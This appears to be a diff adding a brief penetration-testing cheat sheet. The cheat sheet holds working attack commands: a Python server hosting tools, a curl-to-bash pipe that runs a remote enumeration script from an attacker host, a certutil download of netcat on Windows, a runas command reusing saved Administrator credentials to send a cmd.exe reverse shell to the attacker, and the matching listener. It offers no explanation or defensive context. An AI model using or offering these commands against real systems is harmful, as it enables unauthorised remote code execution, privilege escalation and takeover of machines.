@@ -1,0 +1,10 @@
+Python -m SimpleHTTPServer 80
+
+Linux:
+Curl http://Attacker-IP/linenum.sh | bash
+
+Windows:
+Certutil -urlcache -split -f http://Attacker-IP/nc.exe nc.exe
+Runas /user:Administrator /savecred "nc.exe -c cmd.exe Attacker-IP 1337"
+
+nc -lvnp 1337
